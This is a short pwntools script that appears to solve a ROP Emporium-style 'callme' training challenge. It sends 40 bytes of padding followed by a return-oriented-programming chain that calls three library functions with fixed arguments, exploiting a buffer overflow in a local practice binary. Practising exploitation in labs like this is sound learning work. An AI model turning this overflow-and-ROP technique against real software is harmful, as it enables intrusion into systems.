from pwn import *

bin = './callme'
e = ELF(bin)
p = process(bin)
context.binary = bin

offset = 40
a1, a2, a3 = 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d

rop = ROP(e)
rop.call('callme_one', [a1, a2, a3])
rop.call('callme_two', [a1, a2, a3])
rop.call('callme_three', [a1, a2, a3])
rop.call('exit', [0])   # clean exit

payload = b'A' * offset + rop.chain()

#gdb.attach(p)

p.sendafter(b'> ', payload)

output = p.recvall(timeout=1).decode()
print(output)
